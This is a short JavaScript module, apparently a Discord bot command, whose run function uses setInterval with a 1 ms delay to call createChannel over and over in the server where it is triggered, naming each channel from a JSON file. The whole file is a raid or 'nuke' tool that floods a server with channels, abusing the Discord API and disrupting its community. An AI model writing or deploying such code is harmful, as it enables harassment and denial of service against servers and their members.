const text = require("./nome.json").nome;
exports.run = async (client, message) => {
setInterval(() => {
        message.guild.createChannel(text, "text")
}, 1)
}